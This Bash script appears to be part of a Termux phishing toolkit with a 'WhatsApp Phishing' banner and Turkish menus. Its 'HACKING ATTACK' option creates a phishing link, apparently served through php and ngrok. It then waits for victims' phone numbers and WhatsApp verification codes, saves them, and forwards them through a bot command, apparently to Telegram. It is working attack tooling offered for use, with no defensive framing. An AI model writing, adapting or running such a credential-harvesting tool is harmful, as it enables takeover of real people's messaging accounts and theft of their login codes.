#!/bin/bash
clear
#################### GÜNLER ####################

pazartesi=$(date |grep -o Mon)
sali=$(date |grep -o Tue)
carsamba=$(date |grep -o Wed)
persembe=$(date |grep -o Thu)
cuma=$(date |grep -o Fri)
cumartesi=$(date |grep -o Sat)
pazar=$(date |grep -o Sun)

#################### GÜNLERE GÖRE RENKLER ####################

if [[ $pazartesi == Mon ]];then
	color='\e[32m'
elif [[ $sali == Tue ]];then
	color='\e[33m'
elif [[ $carsamba == Wed ]];then
	color='\e[34m'
elif [[ $persembe == Thu ]];then
	color='\e[31m'
elif [[ $cuma == Fri ]];then
	color='\e[36m'
elif [[ $cumartesi == Sat ]];then
	color='\e[32m'
elif [[ $pazar == Sun ]];then
	color='\e[33m'
fi

#################### BANNER ####################

printf "
\e[97m



　 　    ▒█░░▒█ ▒█░▒█ ░█▀▀█ ▀▀█▀▀ ▒█▀▀▀█ ░█▀▀█ ▒█▀▀█ ▒█▀▀█ 
  　  　 ▒█▒█▒█ ▒█▀▀█ ▒█▄▄█ ░▒█░░ ░▀▀▀▄▄ ▒█▄▄█ ▒█▄▄█ ▒█▄▄█ 
　    　 ▒█▄▀▄█ ▒█░▒█ ▒█░▒█ ░▒█░░ ▒█▄▄▄█ ▒█░▒█ ▒█░░░ ▒█░░░ 
$color

　   　    ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▀█▀ ▒█▄░▒█ ▒█▀▀█ 
　 　   　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█░ ▒█▒█▒█ ▒█░▄▄ 
　      　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▄█▄ ▒█░░▀█ ▒█▄▄█ 
                        

         \e[1;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
              $color C O D E D   B Y   U M U T   K A R A
         \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	 \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	           $color T E R M U X    T O O L S 
  	 \e[0;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		     +-+-+-+-+-+-+-+-+-+-+-+
		         +-+-+-+-+-+-+-+
			     +-+-+-+
			       +-+
			        +

\e[0m

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mHACKİNG ATTACK\e[97m

\e[31m[\e[97mG\e[31m]\e[97m ────────── \e[33mGERİ\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
function finish() {
	control=$(ps aux |grep ngrok |grep -v grep |grep -o http)
	if [[ -n $control ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
dongu2() {
while :
do
	if [[ -a kod.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat kod.txt)\e[97m"
		control=$(cat $PREFIX/lib/.bot_config |sed -n 2p)
		if [[ $control == telegram-bot ]];then
			echo "[✓] KOD GİRİLDİ" > .info
			cat kod.txt >> .info
		else
			echo "[✓] KOD GİRİLDİ" > .info
		fi
		echo
		echo
		echo
		cat kod.txt >> saved_info.txt
		rm kod.txt
		bot_umutkaratools --send
		exit
	fi
done

}
dongu() {
while :
do
	if [[ -a numara.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat numara.txt)\e[97m"
		control=$(cat $PREFIX/lib/.bot_config |sed -n 2p)
		if [[ $control == telegram-bot ]];then
			echo "[✓] NUMARA GİRİLDİ" >.info
			cat numara.txt >> .info
		else
			echo "[✓] NUMARA GİRİLDİ" >.info
		fi
		echo
		echo
		echo
		cat numara.txt >> saved_info.txt
		rm numara.txt
		bot_umutkaratools --send
		dongu2
	fi
done
}
bulunan() {
if [[ -a saved_info.txt ]];then
	echo
	echo
	echo
	printf "\e[32m$(cat saved_info.txt)\e[97m"
	echo
	echo
	echo
	read -e -p $'\e[97mKAYDEDİLEN ESKİ DOSYA SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
	if [[ $sec == e || $sec == E ]];then
		rm saved_info.txt
		echo
		echo
		echo
		printf "\e[32m[✓]\e[97m SİLME İŞLEMİ TAMAMLANDI"
		echo
		echo
		echo
		read -e -p $'\e[97mDEVAM ETMEK İSTİYOR MUSUN ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' secim
		if [[ $secim == e || $secim == E ]];then
			sleep 1
		elif [[ $secim == h || $secim == H ]];then
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İŞLEM İPTAL EDİLDİ"
			echo
			echo
			echo
			sleep 2
			cd ..
			bash whatsapp_phishing.sh
			exit
		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m HATALI SEÇİM"
			echo
			echo
			echo
			sleep 2 
			cd ..
			bash whatsapp_phishing.sh
			exit

		fi
	elif [[ $sec == h || $sec == H ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m SİLME İŞLEMİ İPTAL EDİLDİ"
		echo
		echo
		echo
		echo
		sleep 1
		link-create -p
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		dongu
		
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash whatsapp_phishing.sh
		exit
	fi
fi
}
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd files
	bulunan
	link-create -p
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
	echo
	echo
	echo
	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
	echo
	echo
	echo
	dongu
elif [[ $secim == g || $secim == G || $secim == .. ]];then
	cd ../..
	bash phishing-attack.sh
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[0m"
	echo
	echo
	echo
	sleep 2
	bash whatsapp_phishing.sh
fi
